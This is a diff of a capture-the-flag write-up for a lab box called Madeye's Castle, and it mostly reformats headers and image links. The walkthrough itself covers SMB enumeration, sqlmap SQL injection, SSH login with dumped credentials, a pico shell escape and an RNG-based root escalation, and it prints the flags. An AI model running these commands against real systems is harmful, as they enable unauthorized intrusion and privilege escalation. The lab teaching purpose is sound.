@@ -1,47 +1,49 @@
 ---
 sticker: emoji//1f3f0
 ---
+# ENUMERATION
+---
 
-# MADEYE'S CASTLE
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 20   | ssh     |
 | 80   | http    |
 | 139  | smb     |
 | 445  | smb     |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We can begin by checking the smb protocol, maybe anonymous login is enabled:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171325.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171325.png)
 
 There we go, we got an interesting share: `sambashare`, let's check the files inside of it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171351.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171351.png)
 
 We got two files, let's read them:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171408.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171408.png)
 
 `spellnames.txt` is a wordlist, it seems like we need to bruteforce some sort of login page, let's check the web application:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171441.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171441.png)
 
 Simple apache2 page, if we check source code, we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171510.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171510.png)
 
 We got a subdomain, let's add it to `/etc/hosts`:
 
@@ -51,7 +53,7 @@ echo '10.10.196.103 hogwartz-castle.thm' | sudo tee -a /etc/hosts
 
 If we go inside the subdomain, we can check this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404171657.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404171657.png)
 
 We got the login page, based on that, we can craft the following hydra command to bruteforce:
 
@@ -116,6 +118,7 @@ email                   [Status: 200, Size: 1527, Words: 236, Lines: 44, Duratio
 
 There we go, we got something interesting, an `email` directory, let's take a look:
 
+
 We get the following contents:
 
 ```
@@ -164,17 +167,21 @@ madeye
 
 Nothing important, we are missing something, for example, we only tested for brute force in the login page but nothing else, what about `SQLI`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404173656.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404173656.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404173707.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404173707.png)
 
 There we go, `SQLI` is possible in this website, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
+
+
+# EXPLOITATION
+---
+
 
 Since we already know we got `SQLI`, we can use `sqlmap` to speed up the process:
+
 
 ```
 sqlmap -u 'http://hogwartz-castle.thm/login' --random-agent --method POST --data 'user=Harry&password=pass' -p user --skip passwrd --level 5 --risk 3 --dbms SQLite --dump -T users -C name,password,admin,notes --flush-session --threads 10 --no-cast --tamper unionalltounion --union-char 1337
@@ -204,22 +211,27 @@ There we go, we got the credentials, since the username is the first name of him
 harry:wingardiumleviosa123
 ```
 
+
 We can now go into ssh using those credentials:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404182627.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404182627.png)
 
 ```
 harry@hogwartz-castle:~$ cat user1.txt
 RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
 ```
 
+
 Let's start privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 Let's check our sudo privileges:
+
 
 ```
 harry@hogwartz-castle:~$ sudo -l
@@ -234,7 +246,7 @@ User harry may run the following commands on hogwartz-castle:
 
 Weird, we can run `/usr/bin/pico` as user`hermonine`, let's check this on `gtfobins`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404182759.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404182759.png)
 
 Let's do this:
 
@@ -244,7 +256,7 @@ ctrl R ctrl X
 reset; sh 1>&0 2>&0
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404183940.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404183940.png)
 
 Let's get a more comfortable shell:
 
@@ -252,20 +264,21 @@ Let's get a more comfortable shell:
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404183955.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404183955.png)
 
 ```
 hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt
 RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
 ```
 
+
 If we check `find / -perm -4000 2>/dev/null`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404184310.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404184310.png)
 
 Interesting, there's something called `/srv/time-turner/swagger`, let's take a look:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404184352.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404184352.png)
 
 It seems like some sort of RNG is happening behind this, we can analyze it with `ghidra` or test this other stuff:
 
@@ -273,21 +286,24 @@ It seems like some sort of RNG is happening behind this, we can analyze it with 
 echo '111' | /srv/time-turner/swagger | grep "of" | cut -f5 -d' ' | /srv/time-turner/swagger ;
 ```
 
-**How the Hijack Works:**
+##### **How the Hijack Works**:
 
-*   **Predictable RNG**:\
-    The binary uses the input (e.g., `111`) to generate its output. If the RNG is poorly implemented (e.g., uses input as a seed without proper entropy), the output becomes predictable.
-
+- **Predictable RNG**:  
+    The binary uses the input (e.g., `111`) to generate its output. If the RNG is poorly implemented (e.g., uses input as a seed without proper entropy), the output becomes predictable.  
+    
     Example:
+    - Input `111` → Output `456`.
+    - Input `456` → Output `789`.
+        
+- **Controlled Feedback**:  
+    By extracting the output number and piping it back into the binary, the attacker forces the RNG into a deterministic sequence. This bypasses randomness.
 
-    * Input `111` → Output `456`.
-    * Input `456` → Output `789`.
-* **Controlled Feedback**:\
-  By extracting the output number and piping it back into the binary, the attacker forces the RNG into a deterministic sequence. This bypasses randomness.
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404184846.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404184846.png)
+
 
 We can use the following to get `root.txt`, we can change the method and get our `authorized` to gain a shell as root, to the simplicity of things, let's simply read the flag:
+
 
 ```
 TD=$(mktemp -d)
@@ -310,4 +326,6 @@ Root flag is:
 RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404185921.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404185921.png)
+
